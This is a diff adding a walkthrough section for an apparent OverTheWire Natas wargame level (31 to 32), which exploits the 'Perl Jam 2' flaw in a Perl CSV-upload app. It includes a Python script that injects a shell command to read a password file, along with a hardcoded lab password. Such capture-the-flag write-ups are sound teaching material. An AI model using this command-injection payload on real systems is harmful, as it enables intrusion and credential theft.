@@ -1019,9 +1019,32 @@ print(answer.text)
 ```
 The password for the next level can be found in the content.
 
+### Natas Level 31 → Level 32
+**Key Takeaways**  
 
+* The app takes in a CSV file and displays its content in a nicely formatted table.
+* Looking at the source code, the app is seen to use the CGI function in Perl, and the app logic matches the Perl Jam 2 vulnerability.
 
+**Procedure**
 
+1. Log in using the username `natas31` and the password from Level 30.
+
+2. Sample script
+
+```
+import requests
+                                                             
+url = 'http://natas31.natas.labs.overthewire.org/'
+
+auth = ('natas31', 'm7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y')
+
+response = requests.post(url + '/index.pl?cat /etc/natas_webpass/natas32 | xargs echo |',
+                         files=[('file', ('filename', 'abc'))],
+                         data={'file': 'ARGV'},
+                         auth=auth)
+print(response.text)
+```
+The password for the next level can be found in the content.
 
 
 
